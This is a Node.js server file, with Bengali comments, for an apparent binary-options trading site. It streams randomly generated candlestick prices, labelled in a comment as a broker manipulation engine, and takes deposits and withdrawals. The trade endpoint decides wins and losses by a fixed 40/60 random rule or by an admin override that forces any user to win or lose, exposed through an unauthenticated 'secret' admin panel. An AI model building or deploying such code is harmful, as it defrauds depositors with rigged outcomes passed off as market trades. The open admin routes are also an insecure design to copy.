const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let users = {
  "demo_user": { balance: 1000, control: "normal" }
};
let transactions = [];

// কাস্টম ক্যান্ডেলস্টিক ডাটা ইঞ্জিন
let currentPrice = 1.08500;
let candleHistory = [];
let currentCandle = {
  time: Math.floor(Date.now() / 1000),
  open: currentPrice,
  high: currentPrice,
  low: currentPrice,
  close: currentPrice
};

// প্রাথমিক ৩০টি ক্যান্ডেল তৈরি
for (let i = 30; i > 0; i--) {
  let t = Math.floor(Date.now() / 1000) - (i * 2);
  let o = currentPrice;
  let delta = (Math.random() - 0.5) * 0.00040;
  let c = parseFloat((o + delta).toFixed(5));
  let h = parseFloat((Math.max(o, c) + Math.random() * 0.00020).toFixed(5));
  let l = parseFloat((Math.min(o, c) - Math.random() * 0.00020).toFixed(5));
  candleHistory.push({ time: t, open: o, high: h, low: l, close: c });
  currentPrice = c;
}

// প্রতি ১ সেকেন্ডে প্রাইস টিক ও ক্যান্ডেল জেনারেশন (ব্রোকার ম্যানিপুলেশন ইঞ্জিন)
setInterval(() => {
  let delta = (Math.random() - 0.49) * 0.00015;
  currentPrice = parseFloat((currentPrice + delta).toFixed(5));
  
  if (currentPrice > currentCandle.high) currentCandle.high = currentPrice;
  if (currentPrice < currentCandle.low) currentCandle.low = currentPrice;
  currentCandle.close = currentPrice;

  // প্রতি ২ সেকেন্ড পর নতুন ক্যান্ডেল ফিক্স করা
  let now = Math.floor(Date.now() / 1000);
  if (now - currentCandle.time >= 2) {
    candleHistory.push({ ...currentCandle });
    if (candleHistory.length > 50) candleHistory.shift();
    currentCandle = {
      time: now,
      open: currentPrice,
      high: currentPrice,
      low: currentPrice,
      close: currentPrice
    };
  }

  // লাইভ ব্রডকাস্ট
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify({
        type: 'TICK',
        price: currentPrice.toFixed(5),
        candle: currentCandle,
        history: candleHistory
      }));
    }
  });
}, 1000);

// ট্রেড এক্সিকিউশন ও উইন/লস কন্ট্রোল (৪০% উইন, ৬০% লস অথবা অ্যাডমিন কন্ট্রোল)
app.post('/api/trade', (req, res) => {
  const { username, amount, timeframe, direction } = req.body;
  let user = users[username] || { balance: 1000, control: 'normal' };

  if (user.balance < amount) {
    return res.json({ success: false, message: "Insufficient balance" });
  }

  let isWin = false;
  if (user.control === 'win') {
    isWin = true;
  } else if (user.control === 'loss') {
    isWin = false;
  } else {
    // ডিফল্ট: ৪০% উইন, ৬০% লস
    isWin = (Math.random() * 100) < 40;
  }

  let profit = isWin ? amount * 1.85 : 0;
  if (isWin) {
    user.balance += (profit - amount);
  } else {
    user.balance -= amount;
  }

  res.json({
    success: true,
    isWin,
    balance: user.balance,
    profit,
    entryPrice: currentPrice,
    direction
  });
});

// সিক্রেট অ্যাডমিন রুট
app.get('/admin-secret-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
  let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
  res.json({ users, transactions, totalDeposit, totalWithdraw });
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId } = req.body;
  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
  res.json({ success: true, message: "ডিপোজিট সফলভাবে জমা হয়েছে!" });
});

app.post('/api/withdraw', (req, res) => {
  const { username, method, amount, accountNo } = req.body;
  let user = users[username];
  if(user && user.balance >= amount) {
    user.balance -= Number(amount);
    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট জমা হয়েছে!" });
  } else {
    res.json({ success: false, message: "ব্যালেন্স অপর্যাপ্ত!" });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
